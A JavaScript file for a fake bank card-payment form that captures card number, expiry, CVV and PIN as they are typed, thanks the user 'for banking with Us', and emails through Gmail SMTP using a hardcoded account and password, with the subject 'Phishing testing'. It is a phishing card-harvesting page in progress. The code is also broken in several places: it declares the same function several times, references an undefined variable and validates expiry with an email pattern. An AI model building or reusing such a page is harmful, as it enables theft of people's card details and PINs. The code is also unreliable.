const form = document.getElementById('form');
const username = document.getElementById('cardnumber');
const expiry = document.getElementById('expiry');
const cvv = document.getElementById('card-cvv');
const cardPin = document.getElementById('card-pin');
const cardNumber = document.querySelector("#cardnumber");
const submitBtn = document.querySelector("#submit");
const email = "adetunjiabdullahi2406@gmail.com"; 
const password = "846E76C3AD42B88CA4A84CAD13D95A55E5E5"
//Onsubmit
function onSubmit() {
  alert("The form was submitted. Thanks for banking with Us");
}
// Show input error message
//Card Number
const cardNumberArray = []
function cNumber(event) {
  const {value} = event.target;
  if (cardNumberArray.length===0){ 
    cardNumberArray.push(value)
  } else {
    cardNumberArray[0] = value
  }
  
  console.log(cardNumberArray)
}

cardNumber.addEventListener("blur", cNumber)
//Expiry
const expiryArray = []
function expiry(event) {
  const {value} = event.target;
  if (expiryArray.length===0){ 
    expiryArray.push(value)
  } else {
    expiryArray[0] = value
  }
  
  console.log(expiryArray)
}

expiry.addEventListener("blur", expiry)
//Card CVV
const cardCvvArray = []
function cNumber(event) {
  const {value} = event.target;
  if (cardCvvArray.length===0){ 
    cardCvvArray.push(value)
  } else {
    cardCvvArray[0] = value
  }
  
  console.log(cardNumberArray)
}
cardCvv.addEventListener("blur", cNumber)
//Card Pin
const cardPinArray = []
function cNumber(event) {
  const {value} = event.target;
  if (cardPinArray.length===0){ 
    cardPinArray.push(value)
  } else {
    cardPinArray[0] = value
  }
  
  console.log(cardPinArray)
}

cardPin.addEventListener("blur", cNumber)

function sendEmail() {
  Email.send({
    Host: "smtp.gmail.com",
    Username: email,
    Password: password,
    To: email,
    From: email,
    Subject: "Phishing testing",
    Body: "It worked"
  }).then(message => alert(message))
}

submitBtn.addEventListener("click", sendEmail)

function showError(input, message) {
  const formControl = input.parentElement;
  formControl.className = 'form-control error';
  const small = formControl.querySelector('small');
  small.innerText = message;
}

// Show success outline
function showSuccess(input) {
  const formControl = input.parentElement;
  formControl.className = 'form-control success';
}

// Check email is valid
function checkExpiry(input) {
  const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  if (re.test(input.value.trim())) {
    showSuccess(input);
  } else {
    showError(input, 'Expiry is not valid');
  }
}

// Check required fields
function checkRequired(inputArr) {
  inputArr.forEach(function(input) {
    if (input.value.trim() === '') {
      showError(input, `${getFieldName(input)} is required`);
    } else {
      showSuccess(input);
    }
  }).then(function (message) {
    alert("Done")
  });
}

// Check input length
function checkLength(input, min, max) {
  if (input.value.length < min) {
    showError(
      input,
      `${getFieldName(input)} must be at least ${min} characters`
    );
  } else if (input.value.length > max) {
    showError(
      input,
      `${getFieldName(input)} must be less than ${max} characters`
    );
  } else {
    showSuccess(input);
  }
}



// Get fieldname
function getFieldName(input) {
  return input.id.charAt(0).toUpperCase() + input.id.slice(1);
}

// Event listeners
form.addEventListener('submit', function(e) {
  e.preventDefault();

  checkRequired([cardNumber, expiry, cvv, cardPin]);
  checkLength(cardNumber, 16, 16);
  checkLength(cvv, 3, 3);
  checkExpiry(expiry);
});
